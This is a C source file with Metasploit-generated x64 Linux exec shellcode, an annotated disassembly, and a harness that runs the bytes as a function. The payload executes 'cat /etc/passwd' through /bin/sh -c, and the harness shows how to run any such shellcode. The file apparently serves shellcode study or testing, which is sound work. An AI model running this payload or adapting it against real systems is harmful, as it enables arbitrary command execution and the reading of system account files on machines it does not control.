/*
  This is the msfvnom shellcode for the payload linux/x64/exec

  Generated with command:
        msfvenom -p linux/x64/exec CMD="cat /etc/passwd" -f c
*/

/*
  ASM

        6a 3b                   push   0x3b
        58                      pop    rax
        99                      cdq
        48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f6e69622f
        73 68 00
        53                      push   rbx
        48 89 e7                mov    rdi,rsp
        68 2d 63 00 00          push   0x632d
        48 89 e6                mov    rsi,rsp
        52                      push   rdx
        e8 10 00 00 00          call   4090 <code+0x30>
        63 61 74                movsxd esp,DWORD PTR [rcx+0x74]
        20 2f                   and    BYTE PTR [rdi],ch
        65 74 63                gs je  40eb <_end+0x4b>
        2f                      (bad)
        70 61                   jo     40ec <_end+0x4c>
        73 73                   jae    4100 <_end+0x60>
        77 64                   ja     40f3 <_end+0x53>
        00 56 57                add    BYTE PTR [rsi+0x57],dl
        48 89 e6                mov    rsi,rsp
        0f 05                   syscall
*/



#include <stdio.h>
#include <string.h>

unsigned char code[]= \
"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x10\x00"
"\x00\x00\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73"
"\x77\x64\x00\x56\x57\x48\x89\xe6\x0f\x05";

void main()
{
        printf("ShellCode Lenght: %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
